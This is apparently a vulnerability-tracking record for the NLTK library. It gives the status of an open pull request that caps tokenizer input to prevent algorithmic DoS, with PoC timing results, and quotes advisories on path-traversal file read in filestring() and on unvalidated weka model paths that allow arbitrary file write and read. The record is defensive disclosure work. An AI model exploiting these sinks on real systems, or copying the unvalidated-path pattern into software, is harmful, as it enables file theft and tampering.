Status: IN PROGRESS (fix on an open pull request, not yet on develop).

PR: #3895 "[WIP] Bound algorithmic-DoS and uncontrolled-recursion vectors (CWE-400/407/674/1333)", open, head b22ebe144.

Fix commit: e20c40e26 "Bound tokenizer/parser algorithmic DoS (ffr9/gpwc/8fx7)" (LegalitySyllableTokenizer.tokenize refuses a token longer than MAX_TOKEN_LEN=4096 with ValueError naming CWE-407).

No probe. The advisory PoC re-run: on the PR head the 32k vowel token is refused and under the cap the tokenizer scales 0.8x over a 4x input (1k vs 4k); on develop 2fa3f48fe it scales 14.2x over a 4x input (8k 0.087 s, 32k 1.245 s), so develop is still VULNERABLE. The related merged PR #3911 (25beee962) bounds the SyllableTokenizer vowel accumulation, a different tokenizer, and does not cover this sink.

Release: none.

vulnerabilities.summary: NLTK has Arbitrary File Read via Absolute Path Input in nltk.util.filestring()
vulnerabilities.details: A vulnerability in the `filestring()` function of the `nltk.util` module in nltk version 3.9.2 allows arbitrary file read due to improper validation of input paths. The function directly opens files specified by user input without sanitization, enabling attackers to access sensitive system files by providing absolute paths or traversal paths. This vulnerability can be exploited locally or remotely, particularly in scenarios where the function is used in web APIs or other interfaces that accept user-supplied input.

vulnerabilities.summary: NLTK: WekaClassifier passes an unvalidated caller-controlled model path to the weka JVM, bypassing nltk.pathsec containment
vulnerabilities.details:
## Summary
`WekaClassifier` in NLTK passes a caller-controlled model file path to the weka Java VM without any `nltk.pathsec` validation. `WekaClassifier.train` puts the caller's `model_filename` verbatim into the weka argv `["-d", model_filename, ...]` (weka *writes* the trained model there), and `WekaClassifier._classify_many` puts `self._model` into `["-l", self._model, ...]` (weka *reads* it). Under `nltk.pathsec.ENFORCE=True` (the default on current HEAD), NLTK's stated invariant — established by advisory CVE-2026-81726 / GHSA-8mgp-746c-j5xp — is that caller-controlled model-artifact paths must be bounded to the allowed NLTK data roots before any native tool opens them. `WekaClassifier` is the one `java()`-based tool wrapper that skips this entirely, giving an untrusted workflow arbitrary-location file **write** (`-d`) and an arbitrary file **read/parse oracle** (`-l`), defeating pathsec containment.
